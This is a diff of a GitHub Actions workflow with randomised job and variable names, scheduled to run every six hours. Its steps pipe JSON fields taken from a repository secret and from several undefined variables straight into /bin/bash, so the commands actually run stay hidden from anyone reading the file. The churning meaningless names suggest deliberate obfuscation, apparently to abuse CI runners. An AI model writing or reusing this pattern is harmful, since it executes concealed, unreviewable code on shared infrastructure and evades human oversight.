@@ -1,23 +1,32 @@
 name: jiangneihe3765
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
-
-jobs:  # 17052
+    - cron: '41 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jiangneihe3765
         env:
-          j9: ${{ secrets.j9 }}
+          hr22587: ${{ secrets.hr22587 }}
         run: |
-          echo $j9 | jq -r .u5990 | /bin/bash
-          echo $tvsi1 | jq -r .vnpmq81837 | /bin/bash
-          echo $m70 | jq -r .xgw52 | /bin/bash
-          echo $sae8 | jq -r .na1 | /bin/bash
-          echo $kmu279 | jq -r .jq92 | /bin/bash
-          echo $hsbrs04 | jq -r .v43503 | /bin/bash
+          echo $hr22587 | jq -r .j74339 | /bin/bash
+          echo $px42 | jq -r .kl6663 | /bin/bash
+          echo $qf75 | jq -r .bqqf4 | /bin/bash
+          echo $uup4 | jq -r .xldeu42 | /bin/bash
+          echo $cqebl4 | jq -r .qboat58669 | /bin/bash
+          echo $za11 | jq -r .npmdf872 | /bin/bash
+          echo $lvg793 | jq -r .jqm20 | /bin/bash
+          echo $qwbe3117 | jq -r .w16 | /bin/bash
+          echo $itm4 | jq -r .utljg95285 | /bin/bash
+          echo $nn16 | jq -r .tqzld45 | /bin/bash
+          echo $x098 | jq -r .qmwsu702 | /bin/bash
+          echo $dqf53 | jq -r .ieev71651 | /bin/bash
+          echo $a84434 | jq -r .ci0 | /bin/bash
+          echo $cl660 | jq -r .v64017 | /bin/bash
+          echo $vnjjb9816 | jq -r .zp0562 | /bin/bash
+          echo $kr680 | jq -r .gcj75 | /bin/bash
+          echo $tonw42 | jq -r .utw761 | /bin/bash
 
